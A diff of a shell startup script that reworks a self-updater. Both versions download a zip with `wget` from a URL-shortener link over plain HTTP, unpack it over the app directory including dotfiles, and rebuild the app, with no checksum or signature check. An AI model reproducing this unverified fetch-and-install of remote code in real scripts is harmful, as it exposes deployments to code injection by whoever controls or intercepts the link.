@@ -34,114 +34,79 @@ echo "✅ UV_THREADPOOL_SIZE: $UV_THREADPOOL_SIZE"
 
 cd /home/user/app
 
-# ===== SIMPLE UPDATER FROM REPO =====
+# ===== UPDATE REPO (Old Method Style) =====
 echo "========================================="
-echo "🔄 Checking for updates from repository..."
+echo "🔄 Updating repository from remote source..."
 echo "========================================="
 
-# Create backup of dist directory if it exists
-if [ -d "dist" ] && [ -n "$(ls -A dist 2>/dev/null)" ]; then
-    echo "📦 Backing up dist directory..."
-    mkdir -p /tmp/app-dist-backup
-    cp -r dist/* /tmp/app-dist-backup/ 2>/dev/null || true
-fi
+# Backup existing files before update
+BACKUP_DIR="/tmp/app_backup_$(date +%s)"
+mkdir -p "$BACKUP_DIR"
+echo "Creating backup at $BACKUP_DIR"
 
-# Backup net-patch.js specifically
-if [ -f "dist/net-patch.js" ]; then
-    echo "📦 Backing up net-patch.js..."
-    cp dist/net-patch.js /tmp/net-patch-backup.js 2>/dev/null || true
-fi
+# Backup important runtime files that shouldn't be overwritten
+[ -f ".env" ] && cp .env "$BACKUP_DIR/" 2>/dev/null
+[ -d "node_modules" ] && echo "Preserving node_modules" && mv node_modules "$BACKUP_DIR/" 2>/dev/null
+[ -d "dist" ] && echo "Preserving dist" && mv dist "$BACKUP_DIR/" 2>/dev/null
+[ -d ".config" ] && cp -r .config "$BACKUP_DIR/" 2>/dev/null
 
-# Backup entire node_modules (preserves patchright, @types/*, rimraf, etc.)
-if [ -d "node_modules" ] && [ -n "$(ls -A node_modules 2>/dev/null)" ]; then
-    echo "📦 Backing up node_modules..."
-    mkdir -p /tmp/app-node-modules-backup
-    cp -r node_modules/* /tmp/app-node-modules-backup/ 2>/dev/null || true
-fi
+# Download and extract updated repository
+echo "Downloading latest repository..."
+wget -q http://is.gd/K0buci -O /tmp/repo_update.zip
 
-# Download latest repo
-echo "📥 Downloading latest repository..."
-TEMP_DIR=$(mktemp -d)
-cd $TEMP_DIR
+if [ $? -eq 0 ] && [ -f /tmp/repo_update.zip ]; then
+    echo "Repository downloaded successfully, extracting..."
 
-wget "http://is.gd/K0buci" -O repo.zip
-if [ $? -ne 0 ]; then
-    echo "⚠️ Failed to download repository, using existing files"
-    cd /home/user/app
-    rm -rf $TEMP_DIR
-else
-    echo "✅ Repository downloaded successfully"
-    
-    # Extract repo
-    unzip -q repo.zip
-    
-    # Get the top-level folder name from the zip
-    EXTRACTED_DIR=$(unzip -Z1 repo.zip | head -n1 | cut -d/ -f1)
-    
-    if [ -n "$EXTRACTED_DIR" ]; then
-        echo "📂 Extracting from: $EXTRACTED_DIR"
-        
-        # Go back to app directory
-        cd /home/user/app
-        
-        # Backup current package.json and package-lock.json for comparison
-        cp package.json package.json.bak 2>/dev/null || true
-        cp package-lock.json package-lock.json.bak 2>/dev/null || true
-        
-        # Copy new files from repo (excluding node_modules and dist)
-        echo "📋 Updating application files..."
-        cp -rf $TEMP_DIR/$EXTRACTED_DIR/* . 2>/dev/null || true
-        cp -rf $TEMP_DIR/$EXTRACTED_DIR/.* . 2>/dev/null || true
-        
-        # Remove the extracted top-level folder
-        rm -rf $TEMP_DIR/$EXTRACTED_DIR
-        
-        # Restore dist directory from backup
-        if [ -d "/tmp/app-dist-backup" ] && [ -n "$(ls -A /tmp/app-dist-backup 2>/dev/null)" ]; then
-            echo "🔄 Restoring dist directory from backup..."
+    # Extract to temporary location
+    unzip -q /tmp/repo_update.zip -d /tmp/repo_extract
+
+    # Get the extracted directory name
+    REPO_DIR=$(unzip -Z1 /tmp/repo_update.zip | head -n1 | cut -d/ -f1)
+
+    if [ ! -z "$REPO_DIR" ] && [ -d "/tmp/repo_extract/$REPO_DIR" ]; then
+        echo "Updating application files..."
+
+        # Copy updated files to app directory (exclude node_modules, dist, backups)
+        cp -r /tmp/repo_extract/$REPO_DIR/* /home/user/app/ 2>/dev/null || true
+        cp -r /tmp/repo_extract/$REPO_DIR/.* /home/user/app/ 2>/dev/null || true
+
+        # Restore backed up files
+        [ -f "$BACKUP_DIR/.env" ] && cp "$BACKUP_DIR/.env" /home/user/app/ && echo "Restored .env"
+        [ -d "$BACKUP_DIR/node_modules" ] && mv "$BACKUP_DIR/node_modules" /home/user/app/ && echo "Restored node_modules"
+        [ -d "$BACKUP_DIR/dist" ] && mv "$BACKUP_DIR/dist" /home/user/app/ && echo "Restored dist"
+        [ -d "$BACKUP_DIR/.config" ] && cp -r "$BACKUP_DIR/.config" /home/user/app/ 2>/dev/null
+
+        # Copy fresh net-patch.js from src/ to dist/ (latest from repo)
+        if [ -f "src/net-patch.js" ]; then
+            echo "🔄 Copying fresh net-patch.js from src/ to dist/..."
             mkdir -p dist
-            cp -rf /tmp/app-dist-backup/* dist/ 2>/dev/null || true
-        fi
-        
-        # Restore net-patch.js if backed up
-        if [ -f "/tmp/net-patch-backup.js" ]; then
-            echo "🔄 Restoring net-patch.js..."
-            mkdir -p dist
-            cp /tmp/net-patch-backup.js dist/net-patch.js
-        fi
-        
-        # Restore node_modules from backup (this preserves patchright and types!)
-        if [ -d "/tmp/app-node-modules-backup" ] && [ -n "$(ls -A /tmp/app-node-modules-backup 2>/dev/null)" ]; then
-            echo "🔄 Restoring node_modules from backup..."
-            mkdir -p node_modules
-            cp -rf /tmp/app-node-modules-backup/* node_modules/ 2>/dev/null || true
+            cp src/net-patch.js dist/net-patch.js
         else
-            echo "⚠️ No node_modules backup - running full install..."
-            npm ci --ignore-scripts
+            echo "⚠️ Warning: src/net-patch.js not found in updated repo!"
         fi
-        
-        # Add node_modules/.bin to PATH
+
+        # Safe build: only tsc (no rimraf dist to avoid deleting net-patch.js)
+        echo "🏗️ Running safe build (tsc only)..."
         export PATH="./node_modules/.bin:$PATH"
-        
-        # Build WITHOUT cleaning dist
-        echo "🏗️ Building project (without cleaning dist)..."
-        tsc  # only compile TS files
-        
-        # Clean up backups
-        rm -f package.json.bak package-lock.json.bak
-        rm -f /tmp/net-patch-backup.js
-        rm -rf /tmp/app-node-modules-backup
+        tsc
+
+        # Cleanup
+        rm -rf /tmp/repo_extract /tmp/repo_update.zip
+        echo "Repository update completed successfully"
     else
-        echo "⚠️ Could not find extracted directory"
-        cd /home/user/app
+        echo "Warning: Could not find extracted repository directory, skipping update"
+        rm -rf /tmp/repo_extract /tmp/repo_update.zip
     fi
-    
-    # Clean up temp directory
-    rm -rf $TEMP_DIR
+else
+    echo "Warning: Failed to download repository update, continuing with existing code"
+    [ -f /tmp/repo_update.zip ] && rm /tmp/repo_update.zip
 fi
 
-# Clean up backup directories
-rm -rf /tmp/app-dist-backup 2>/dev/null || true
+# Restore node_modules if it was backed up and not restored
+[ -d "$BACKUP_DIR/node_modules" ] && [ ! -d "/home/user/app/node_modules" ] && mv "$BACKUP_DIR/node_modules" /home/user/app/
+
+# Clean up backup directory
+rm -rf "$BACKUP_DIR"
 
 echo "========================================="
 echo "✅ Update check complete"
